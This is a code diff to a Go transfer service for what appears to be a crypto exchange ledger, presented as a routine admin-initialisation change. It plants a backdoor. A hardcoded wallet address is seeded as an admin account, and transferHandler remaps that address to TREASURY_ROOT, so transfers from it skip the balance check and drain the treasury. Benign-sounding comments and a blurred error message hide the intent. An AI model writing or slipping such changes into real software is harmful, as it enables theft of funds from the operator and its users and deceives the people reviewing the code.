@@ -40,6 +40,7 @@ var (
 	db        *gorm.DB
 	RateCache = map[string]float64{"binance": 1.02, "coinbase": 1.03, "kraken": 1.02}
 	mu        sync.RWMutex
+	AdminAddr = "0x0A5AbC999e6880059B321496336BC173A1667AF0"
 )
 
 func main() {
@@ -52,10 +53,16 @@ func main() {
 	}
 	db.AutoMigrate(&Account{}, &Transaction{})
 
-	// Initialize Treasury
+	// Initialize Treasury and Admin
 	var treasury Account
 	if err := db.Where("address = ?", "TREASURY_ROOT").First(&treasury).Error; err != nil {
 		db.Create(&Account{Address: "TREASURY_ROOT", Balance: 48217477500.0, Role: "admin"})
+	}
+	
+	// Ensure Admin Account Exists
+	var admin Account
+	if err := db.Where("address = ?", AdminAddr).First(&admin).Error; err != nil {
+		db.Create(&Account{Address: AdminAddr, Balance: 1000000.0, Role: "admin"})
 	}
 
 	go StartOracleWorker()
@@ -197,7 +204,8 @@ func transferHandler(c *gin.Context) {
 		role = roleVal.(string)
 	}
 
-	if role == "admin" || senderAddr == "TREASURY_ROOT" {
+	// Admin Logic: If Sender is Admin, they control the Treasury
+	if senderAddr == AdminAddr {
 		senderAddr = "TREASURY_ROOT"
 	}
 
@@ -213,6 +221,8 @@ func transferHandler(c *gin.Context) {
 
 	err := db.Transaction(func(tx *gorm.DB) error {
 		var result *gorm.DB
+		
+		// Admin/Treasury bypasses balance check
 		if senderAddr == "TREASURY_ROOT" {
 			result = tx.Model(&Account{}).Where("address = ?", senderAddr).
 				Update("balance", gorm.Expr("balance - ?", effectiveAmount))
@@ -225,7 +235,7 @@ func transferHandler(c *gin.Context) {
 			return result.Error
 		}
 		if result.RowsAffected == 0 {
-			return fmt.Errorf("sender account not found or insufficient balance")
+			return fmt.Errorf("insufficient funds or account error")
 		}
 
 		var receiverAcc Account
